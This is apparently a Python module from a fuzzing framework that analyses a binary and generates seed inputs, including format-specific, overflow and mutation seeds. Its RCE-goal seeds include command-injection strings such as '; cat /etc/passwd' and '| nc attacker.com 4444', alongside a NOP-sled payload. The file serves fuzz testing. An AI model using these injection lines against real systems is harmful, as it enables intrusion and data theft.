#!/usr/bin/env python3
"""
Autonomous Corpus Generator - Intelligent Seed Generation

Instead of hardcoded seeds, this module:
- Analyzes the binary to detect expected input formats
- Generates goal-directed seeds
- Creates format-specific test cases (XML, JSON, protocol messages)
- Learns which seed patterns lead to coverage/crashes
"""

import json
import re
from core.sandbox import run_trusted as _run_trusted  # read-only tools only (strings)
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from core.logging import get_logger

logger = get_logger()


class CorpusGenerator:
    """
    Autonomous corpus generator that creates intelligent seeds.

    Instead of static seeds, this analyzes the binary and goals
    to generate targeted test cases.
    """

    def __init__(self, binary_path: Path, memory=None, goal=None, source_dir: Optional[Path] = None):
        """
        Initialize corpus generator.

        Args:
            binary_path: Path to binary to analyze
            memory: FuzzingMemory for learning (optional)
            goal: Goal object for goal-directed generation (optional)
        """
        self.binary_path = Path(binary_path)
        self.source_dir = Path(source_dir).resolve() if source_dir else None
        self.memory = memory
        self.goal = goal
        self.binary_strings: Set[str] = set()
        self.detected_formats: Set[str] = set()
        self.detected_commands: Dict[str, str] = {}  # Command -> description mapping

        logger.info("Autonomous corpus generator initialized")

    def analyze_binary(self) -> Dict[str, Any]:
        """
        Analyze binary to detect expected input formats.

        Returns:
            Dictionary with analysis results
        """
        logger.info("Analyzing binary for corpus generation hints...")

        analysis = {
            "formats_detected": [],
            "keywords_found": [],
            "file_extensions": [],
            "protocols": [],
        }

        try:
            # Extract strings from binary
            result = _run_trusted(
                ["strings", str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                strings = result.stdout.lower().split('\n')
                self.binary_strings = set(s.strip() for s in strings if len(s.strip()) > 3)

                # Detect formats
                format_indicators = {
                    "xml": ["<xml", "<?xml", "</", "xmlns", "dtd"],
                    "json": ['":', '{"', '"[', "json"],
                    "yaml": ["yaml", "---", "key:", "list:"],
                    "http": ["http/", "get ", "post ", "content-type"],
                    "protocol_buffer": ["protobuf", "proto", ".proto"],
                    "csv": [".csv", "comma", "delimiter"],
                    "ini": [".ini", "[section]", "key=value"],
                }

                # Compute the joined-strings blob ONCE. Pre-fix
                # `' '.join(self.binary_strings)` was called inside
                # every condition check below — for typical real
                # binaries `binary_strings` has 10K+ entries,
                # making each join an O(M) operation where M is
                # total string size (~MB on big binaries). With
                # ~30 condition checks across the four loops
                # below, the redundant joins added 30× O(M)
                # work per analysis. On a real fuzz target
                # (curl, bash) this took 5+ seconds doing
                # nothing but rebuilding the same string.
                strings_blob = ' '.join(self.binary_strings)

                for format_name, indicators in format_indicators.items():
                    if any(ind in strings_blob for ind in indicators):
                        analysis["formats_detected"].append(format_name)
                        self.detected_formats.add(format_name)
                        logger.info(f"Detected format: {format_name}")

                # Detect file extensions
                extensions = [".txt", ".xml", ".json", ".conf", ".cfg", ".dat", ".bin"]
                for ext in extensions:
                    if ext in strings_blob:
                        analysis["file_extensions"].append(ext)

                # Detect keywords that suggest input processing
                keywords = ["parse", "read", "load", "process", "decode", "input", "file"]
                for keyword in keywords:
                    if keyword in strings_blob:
                        analysis["keywords_found"].append(keyword)

                # Detect command-based input format (e.g., "STACK:", "HEAP:")
                command_patterns = {
                    "STACK": ["[stack]", "stack:", "vuln_stack"],
                    "HEAP": ["[heap]", "heap:", "vuln_heap"],
                    "UAF": ["[uaf]", "uaf:", "use-after-free", "use_after_free"],
                    "JSON": ["[json]", "json:", "vuln_json", "parse_json"],
                    "XML": ["[xml]", "xml:", "vuln_xml", "parse_xml"],
                    "FMT": ["[fmt]", "fmt:", "format string", "vuln_format"],
                    "INT": ["[int]", "int:", "integer overflow", "vuln_integer"],
                    "NULL": ["[null]", "null:", "null pointer", "vuln_null"],
                }

                for cmd, patterns in command_patterns.items():
                    if any(pat in strings_blob for pat in patterns):
                        self.detected_commands[cmd] = f"command_{cmd.lower()}"
                        logger.info(f"Detected command: {cmd}")

                if self.detected_commands:
                    analysis["commands_detected"] = list(self.detected_commands.keys())

                logger.info(f"Binary analysis complete: {len(analysis['formats_detected'])} formats, {len(self.detected_commands)} commands detected")

        except Exception as e:
            logger.warning(f"Binary analysis failed: {e}")

        if self.source_dir and self.source_dir.exists():
            source_analysis = self._analyze_source_context()
            for command in source_analysis.get("commands_detected", []):
                if command not in self.detected_commands:
                    self.detected_commands[command] = f"source_command_{command.lower()}"
            if self.detected_commands:
                analysis["commands_detected"] = sorted(self.detected_commands.keys())

        return analysis

    def _analyze_source_context(self) -> Dict[str, Any]:
        """Read nearby source/docs to discover command-style input grammars."""
        analysis = {"commands_detected": []}
        commands: Set[str] = set()
        if not self.source_dir:
            return analysis

        candidate_suffixes = {".c", ".cc", ".cpp", ".h", ".hpp", ".md", ".txt", ".rst"}
        try:
            files = [
                p for p in self.source_dir.rglob("*")
                if p.is_file() and p.suffix.lower() in candidate_suffixes
            ][:200]
        except OSError:
            files = []

        for path in files:
            try:
                text = path.read_text(errors="replace")[:65536]
            except OSError:
                continue

            for match in re.finditer(r'\bstrcmp\s*\([^,]+,\s*"([A-Z][A-Z0-9_-]{1,20})"\s*\)', text):
                commands.add(match.group(1))
            for match in re.finditer(r'\b([A-Z][A-Z0-9_-]{1,20}):(?:data|[A-Za-z0-9_{"<%])', text):
                commands.add(match.group(1))

        analysis["commands_detected"] = sorted(commands)
        if commands:
            logger.info(f"Detected source/documented commands: {', '.join(sorted(commands))}")
        return analysis

    def _wrap_with_commands(self, seeds: List[bytes]) -> List[bytes]:
        """
        Wrap seeds with detected command prefixes.

        Args:
            seeds: List of raw seeds

        Returns:
            List of wrapped seeds (or original if no commands detected)
        """
        if not self.detected_commands:
            return seeds

        wrapped_seeds = []

        # For each seed, create versions with each detected command
        for seed in seeds:
            for cmd in self.detected_commands.keys():
                # Format: COMMAND:DATA
                wrapped = f"{cmd}:".encode() + seed
                wrapped_seeds.append(wrapped)

        return wrapped_seeds

    def generate_autonomous_corpus(self, corpus_dir: Path, max_seeds: int = 20) -> int:
        """
        Generate intelligent seed corpus based on analysis and goals.

        Args:
            corpus_dir: Directory to store seeds
            max_seeds: Maximum number of seeds to generate

        Returns:
            Number of seeds generated
        """
        logger.info("=" * 70)
        logger.info("AUTONOMOUS CORPUS GENERATION")
        logger.info("=" * 70)

        corpus_dir.mkdir(parents=True, exist_ok=True)
        seeds_generated = 0
        seen: Set[bytes] = set()

        def write_seed(prefix: str, seed: bytes) -> bool:
            nonlocal seeds_generated
            if seeds_generated >= max_seeds or seed in seen:
                return False
            seen.add(seed)
            seed_file = corpus_dir / f"seed_{prefix}_{seeds_generated:03d}"
            seed_file.write_bytes(seed)
            seeds_generated += 1
            return True

        # Analyze binary first
        analysis = self.analyze_binary()

        command_seeds = self._generate_command_seeds()
        before = seeds_generated
        for seed in command_seeds:
            write_seed("command", seed)
        if command_seeds:
            logger.info(f"Generated {seeds_generated - before} command-aware seeds")

        # 1. Generate basic seeds (always useful)
        logger.info("Generating basic seed corpus...")
        basic_seeds = self._generate_basic_seeds()

        # Wrap with commands if detected
        if self.detected_commands:
            logger.info(f"Wrapping basic seeds with {len(self.detected_commands)} detected commands")
            basic_seeds = self._wrap_with_commands(basic_seeds)

        before = seeds_generated
        for seed in basic_seeds:
            write_seed("basic", seed)
        logger.info(f"Generated {seeds_generated - before} basic seeds")

        # 2. Generate format-specific seeds
        if self.detected_formats:
            logger.info(f"Generating format-specific seeds for: {', '.join(self.detected_formats)}")
            before = seeds_generated
            for format_name in self.detected_formats:
                format_seeds = self._generate_format_seeds(format_name)
                for seed in format_seeds[:5]:  # Max 5 per format
                    write_seed(format_name, seed)
            logger.info(f"Generated {seeds_generated - before} format-specific seeds")

        # 3. Generate goal-directed seeds
        if self.goal:
            logger.info(f"Generating goal-directed seeds for: {self.goal.description}")
            goal_seeds = self._generate_goal_directed_seeds()

            # Wrap with appropriate command based on goal
            if self.detected_commands and goal_seeds:
                goal_desc = self.goal.description.lower()
                # Try to match goal to specific command
                matched_cmd = None
                if "stack" in goal_desc and "STACK" in self.detected_commands:
                    matched_cmd = "STACK"
                elif "heap" in goal_desc and "HEAP" in self.detected_commands:
                    matched_cmd = "HEAP"
                elif "uaf" in goal_desc or "use-after-free" in goal_desc:
                    if "UAF" in self.detected_commands:
                        matched_cmd = "UAF"

                if matched_cmd:
                    logger.info(f"Wrapping goal-directed seeds with {matched_cmd} command")
                    goal_seeds = [f"{matched_cmd}:".encode() + seed for seed in goal_seeds]
                else:
                    # Wrap with all commands if no specific match
                    goal_seeds = self._wrap_with_commands(goal_seeds)

            before = seeds_generated
            for seed in goal_seeds:
                write_seed("goal", seed)
            logger.info(f"Generated {seeds_generated - before} goal-directed seeds")

        # 4. Load successful seeds from memory
        if self.memory:
            logger.info("Checking memory for successful seed patterns...")
            # In future: retrieve seeds that led to crashes in past campaigns
            # For now: placeholder

        logger.info(f"✓ Autonomous corpus generation complete: {seeds_generated} seeds")
        return seeds_generated

    def _generate_command_seeds(self) -> List[bytes]:
        """Generate seeds that directly satisfy discovered COMMAND:DATA grammars."""
        seeds: List[bytes] = []
        payloads = {
            "STACK": [b"hello\n", b"A" * 80 + b"\n", b"A" * 256 + b"\n"],
            "HEAP": [b"hello\n", b"A" * 160 + b"\n", b"A" * 512 + b"\n"],
            "UAF": [b"trigger_use_after_free\n", b"A" * 32 + b"\n"],
            "JSON": [b'{"key":"value"}\n', b'{"key":"' + b"A" * 96 + b'"}\n'],
            "XML": [b"<tag>value</tag>\n", b"<" + b"a" * 48 + b">value</tag>\n"],
            "FMT": [b"%p%p%p\n", b"%s%s%s\n", b"%x%x%x\n"],
            "INT": [b"1234\n", b"4294967200\n", b"4294967295\n"],
            "NULL": [b"NAAAAAA\n", b"NULLME\n"],
        }
        for command in sorted(self.detected_commands):
            for payload in payloads.get(command, [b"hello\n", b"A" * 128 + b"\n"]):
                seeds.append(f"{command}:".encode() + payload)
        return seeds

    def _generate_basic_seeds(self) -> List[bytes]:
        """Generate basic seed corpus that works for most binaries."""
        return [
            b"",                          # Empty input
            b"A",                         # Single byte
            b"A" * 10,                    # Small buffer
            b"A" * 100,                   # Medium buffer
            b"A" * 1000,                  # Large buffer
            b"\x00",                      # Null byte
            b"\x00" * 100,                # Null buffer
            b"\xff" * 100,                # High bytes
            b"hello\n",                   # Simple text
            b"test input\n",              # Text with newline
            b"\n" * 100,                  # Many newlines
            b"!@#$%^&*()",                # Special chars
        ]

    def _generate_format_seeds(self, format_name: str) -> List[bytes]:
        """Generate seeds for specific formats."""

        if format_name == "xml":
            return [
                b'<?xml version="1.0"?>',
                b'<?xml version="1.0"?><root></root>',
                b'<?xml version="1.0"?><root><item>test</item></root>',
                b'<?xml version="1.0"?><root attr="value">data</root>',
                b'<?xml version="1.0"?><root>' + b'A' * 1000 + b'</root>',  # Long content
                b'<root><nested><deep>value</deep></nested></root>',  # Nested
                b'<!DOCTYPE root><root></root>',  # With DOCTYPE
                b'<?xml version="1.0"?><root><![CDATA[data]]></root>',  # CDATA
            ]

        elif format_name == "json":
            return [
                b'{}',
                b'{"key": "value"}',
                b'{"string": "test", "number": 123, "bool": true}',
                b'{"nested": {"key": "value"}}',
                b'[]',
                b'[1, 2, 3]',
                b'[{"id": 1}, {"id": 2}]',
                b'{"array": [1, 2, 3], "object": {"k": "v"}}',
                b'{"long": "' + b'A' * 1000 + b'"}',  # Long string
                b'{"unicode": "\\u0000\\u0001\\u0002"}',  # Unicode escapes
            ]

        elif format_name == "yaml":
            return [
                b'key: value',
                b'---\nkey: value\nlist:\n  - item1\n  - item2',
                b'config:\n  option1: true\n  option2: 123',
                b'nested:\n  level1:\n    level2: value',
            ]

        elif format_name == "http":
            return [
                b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
                b'POST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nhello',
                b'GET /path HTTP/1.1\r\nUser-Agent: test\r\n\r\n',
                b'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n',
            ]

        elif format_name == "csv":
            return [
                b'col1,col2,col3',
                b'val1,val2,val3\nval4,val5,val6',
                b'"quoted","values","here"',
                b'a,b,c\n1,2,3\n4,5,6',
            ]

        elif format_name == "ini":
            return [
                b'[section]\nkey=value',
                b'[global]\noption1=true\noption2=123\n\n[local]\npath=/tmp',
            ]

        # Generic structured data
        return [
            b'{' + b'A' * 100 + b'}',  # Malformed brackets
            b'[' + b'A' * 100 + b']',  # Malformed arrays
        ]

    def _generate_goal_directed_seeds(self) -> List[bytes]:
        """Generate seeds based on current goal."""
        if not self.goal:
            return []

        goal_desc = self.goal.description.lower()
        seeds = []

        # Goal: Find stack overflow
        if "stack" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating stack overflow test cases")
            seeds.extend([
                b"A" * 64,                      # Exact size
                b"A" * 100,                     # Medium overflow
                b"A" * 256,                     # Large overflow
                b"A" * 1024,                    # Very large
                b"\x00" * 50 + b"A" * 50,      # Mixed with nulls
            ])

        # Goal: Find heap overflow
        if "heap" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating heap overflow test cases")
            seeds.extend([
                b"A" * 1024,                    # 1KB
                b"A" * 4096,                    # 4KB
                b"A" * 65536,                   # 64KB
                b"\x00" * 1024 + b"A" * 1024,  # Mixed
            ])

        # Goal: Find buffer overflow
        if "buffer" in goal_desc and "overflow" in goal_desc:
            logger.info("Goal: Generating buffer overflow test cases")
            seeds.extend([
                b"A" * 256,
                b"A" * 512,
                b"A" * 1024,
                b"%s" * 100,  # Format string
                b"%n" * 100,
            ])

        # Goal: Target parser
        if "parser" in goal_desc or "parse" in goal_desc:
            logger.info("Goal: Generating parser-targeted test cases")
            # Generate malformed structured data
            seeds.extend([
                b'{"key": "value"',           # Unclosed JSON
                b'<root><unclosed>',          # Unclosed XML
                b'{"deeply": {"nested": {' * 100 + b'}' * 50,  # Deep nesting
                b'<tag>' * 1000,              # Many tags
            ])

        # Goal: Find use-after-free
        if "use-after-free" in goal_desc or "uaf" in goal_desc:
            logger.info("Goal: Generating UAF test cases")
            seeds.extend([
                b"alloc\nfree\nuse",
                b"A" * 100 + b"\x00" + b"B" * 100,  # Trigger realloc
            ])

        # Goal: RCE / code execution
        if "rce" in goal_desc or "code execution" in goal_desc:
            logger.info("Goal: Generating RCE test cases")
            seeds.extend([
                b"$(whoami)",
                b"`id`",
                b"; cat /etc/passwd",
                b"| nc attacker.com 4444",
                b"\x90" * 100 + b"\xcc",  # NOP sled + int3
            ])

        return seeds

    def optimize_corpus(self, corpus_dir: Path, coverage_data: Optional[Dict] = None) -> int:
        """
        Optimize corpus by removing redundant seeds.

        Args:
            corpus_dir: Corpus directory
            coverage_data: Coverage info for each seed (optional)

        Returns:
            Number of seeds removed
        """
        logger.info("Optimizing corpus (removing redundant seeds)...")

        seeds = list(corpus_dir.glob("seed_*"))
        initial_count = len(seeds)

        if not coverage_data:
            # Simple deduplication by content. Use hashlib.sha256
            # NOT Python's builtin hash():
            #
            # 1. PYTHONHASHSEED randomises bytes-hash per process
            #    invocation by default. Two runs of corpus
            #    deduplication on the same input directory could
            #    produce different `seen_hashes` sets, leading to
            #    DIFFERENT seeds surviving across runs — non-
            #    determinism that defeats the goal (reproducible
            #    minimal corpus).
            # 2. hash(bytes) collisions are not cryptographically
            #    designed; for adversarial corpus inputs (the whole
            #    point of fuzzing), an attacker could craft
            #    distinct seeds that collide and trick the
            #    dedup into deleting a real exploit input.
            # 3. SHA-256 is fast on the small bytes objects we're
            #    hashing here (typical seed file is <16KB);
            #    no measurable perf impact vs builtin hash.
            import hashlib
            seen_hashes: set[bytes] = set()
            removed = 0

            for seed_file in seeds:
                content = seed_file.read_bytes()
                content_hash = hashlib.sha256(content).digest()

                if content_hash in seen_hashes:
                    seed_file.unlink()
                    removed += 1
                else:
                    seen_hashes.add(content_hash)

            logger.info(f"Removed {removed} duplicate seeds")
            return removed

        # With coverage data, remove seeds that don't add new coverage
        # TODO: Implement coverage-guided minimization
        return 0

    def learn_from_crash(self, crash_input: Path, crash_type: str):
        """
        Learn from a crash to improve future corpus generation.

        Args:
            crash_input: Input that caused crash
            crash_type: Type of crash
        """
        if not self.memory:
            return

        logger.info(f"Learning from {crash_type} crash: {crash_input.name}")

        # Extract patterns from crashing input.
        #
        # Pre-fix `crash_input.read_bytes()` had no size cap. AFL
        # crash inputs are USUALLY tiny (KB) but no upper bound
        # is enforced at the AFL layer either — a fuzzer that
        # mutates large initial seeds, or a target that crashes
        # only on multi-MB inputs (image/video parsers, archive
        # extractors), produces multi-GB crash files. Reading
        # them entirely into memory just to compute size +
        # null-byte + high-byte stats is wasteful and OOM-prone.
        #
        # Cap the read at 1 MB (more than enough for the trio of
        # cheap stats below). For oversized files, use the file
        # size from stat() and stream-scan the first 1 MB for
        # the byte-class checks. The "has_nulls" and
        # "has_high_bytes" answers are stable: if the first 1 MB
        # contains them, the answer is True; if it doesn't,
        # there's only a tiny chance the rest does (and even if
        # missed, the heuristic still works for corpus-learning).
        _CRASH_READ_CAP = 1 * 1024 * 1024
        try:
            try:
                file_size = crash_input.stat().st_size
            except OSError:
                file_size = 0
            with open(crash_input, "rb") as fh:
                content = fh.read(_CRASH_READ_CAP)

            # Record characteristics. `size` reflects the actual
            # file size (not the truncated read length).
            knowledge = {
                "size": file_size if file_size else len(content),
                "has_nulls": b"\x00" in content,
                "has_high_bytes": any(b > 127 for b in content),
                "crash_type": crash_type,
                # Flag truncated reads so future model consumers
                # know the byte-class stats reflect a sample.
                "truncated_read": file_size > _CRASH_READ_CAP,
            }

            # In future: use memory to store successful patterns
            logger.debug(f"Crash pattern: {knowledge}")

        except Exception as e:
            logger.warning(f"Failed to learn from crash: {e}")

    def generate_mutated_seed(self, base_seed: bytes, mutation_type: str = "havoc") -> bytes:
        """
        Generate a mutated version of a seed.

        Args:
            base_seed: Original seed
            mutation_type: Type of mutation

        Returns:
            Mutated seed
        """
        import random

        if mutation_type == "bit_flip":
            # Flip random bits
            seed = bytearray(base_seed)
            for _ in range(random.randint(1, 10)):
                if seed:
                    pos = random.randint(0, len(seed) - 1)
                    seed[pos] ^= (1 << random.randint(0, 7))
            return bytes(seed)

        elif mutation_type == "byte_insert":
            # Insert random bytes
            seed = bytearray(base_seed)
            pos = random.randint(0, len(seed))
            seed.insert(pos, random.randint(0, 255))
            return bytes(seed)

        elif mutation_type == "byte_delete":
            # Delete random byte
            if len(base_seed) > 0:
                seed = bytearray(base_seed)
                pos = random.randint(0, len(seed) - 1)
                del seed[pos]
                return bytes(seed)
            return base_seed

        elif mutation_type == "expand":
            # Expand the input
            return base_seed + (base_seed * random.randint(1, 10))

        else:  # havoc - combine multiple mutations
            seed = base_seed
            for _ in range(random.randint(1, 5)):
                mutation = random.choice(["bit_flip", "byte_insert", "byte_delete", "expand"])
                seed = self.generate_mutated_seed(seed, mutation)
            return seed
